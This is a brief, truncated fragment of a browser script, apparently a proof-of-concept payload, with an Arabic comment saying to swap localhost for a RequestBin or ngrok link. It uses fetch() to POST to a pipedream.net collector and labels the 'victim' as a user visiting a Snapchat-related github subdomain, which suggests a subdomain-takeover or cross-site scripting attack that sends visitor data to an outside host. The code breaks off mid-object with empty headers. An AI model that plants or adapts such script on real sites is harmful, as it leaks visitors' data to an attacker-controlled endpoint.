   <script>

            // استبدل localhost برابط RequestBin أو ngrok
            fetch('https://eoegsy3lrhynxxw.m.pipedream.net', {
                method: 'POST',

                headers: {

                },

                    victim: "User visiting github.snappublisher.snapchat.com",
